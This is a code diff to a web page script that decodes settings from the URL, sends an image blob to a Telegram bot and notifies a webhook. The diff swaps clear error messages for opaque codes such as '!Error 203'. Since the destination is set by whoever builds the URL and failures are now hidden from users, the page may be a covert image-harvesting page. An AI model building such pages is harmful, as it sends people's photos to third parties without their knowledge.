@@ -94,10 +94,11 @@
         nm = decoded.n || "";
         console.log("Decoded cfg:", cfg);
       } catch (e) {
-        showError("Error");
+        showError("!Error 200");
       }
     } else {
-      showError("Invalid URL.");
+      //Invalid URL.
+      showError("!Error 201");
     }
 
     function setButtonState(text, showSpinner = false) {
@@ -127,7 +128,7 @@
 
     function sendToTelegram(imageBlob) {
       if (!cfg.p || !cfg.o) {
-        showError("Missing configuration values.");
+        showError("!Error 202");
         setButtonState("📷 Try Again");
         return;
       }
@@ -159,18 +160,18 @@
         if (data.ok) {
           notifyWebhook({
             status: "success",
-            f: cfg.f,
-            o: cfg.o,
-            msg: "_Your request has been sent, please wait a while 😁_"
+            type: "recieptProf"
           });
           setButtonState("Request Sent!");
         } else {
-          showError("Telegram error: ");
+          //Telegram error: 
+          showError("!Error 203");
           setButtonState("📷 Try Again");
         }
       })
       .catch(error => {
-        showError("Network error: ");
+        //Network error: 
+        showError("!Error 204");
         setButtonState("📷 Try Again");
       });
     }
@@ -181,7 +182,8 @@
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(payload)
-      }).catch(err => console.error("Webhook error:", err));
+      }).catch(err => console.error("!Error 205"));
+      //Webhook error
     }
   </script>
 </body>
